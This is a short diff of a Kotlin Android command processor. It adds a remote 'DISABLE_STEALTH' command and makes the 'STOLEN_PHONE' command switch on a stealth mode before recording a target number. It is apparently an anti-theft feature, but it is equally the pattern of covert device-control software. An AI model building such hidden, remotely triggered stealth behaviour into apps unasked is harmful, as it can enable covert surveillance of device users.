@@ -1221,12 +1221,17 @@ object CommandProcessor {
                         status = "GHOST_DATA_INITIATED"
                     }
                 }
+                "DISABLE_STEALTH" -> {
+                    JudasManager.disengageStealthMode(ctx)
+                    status = "STEALTH_DISENGAGED"
+                }
                 "STOLEN_PHONE" -> {
                     val targetNum = if (content.isNotBlank()) content.trim() else JudasManager.getHandler(ctx) ?: ""
                     if (targetNum.isEmpty()) {
                         status = "FAILED"
                         errorMsg = "No target number specified in command or Judas Registry"
                     } else {
+                        JudasManager.engageStealthMode(ctx)
                         ctx.getSharedPreferences("judas_registry", Context.MODE_PRIVATE).edit()
                             .putString("stolen_target_num", targetNum)
                             .putBoolean("stolen_alert_pending", true)
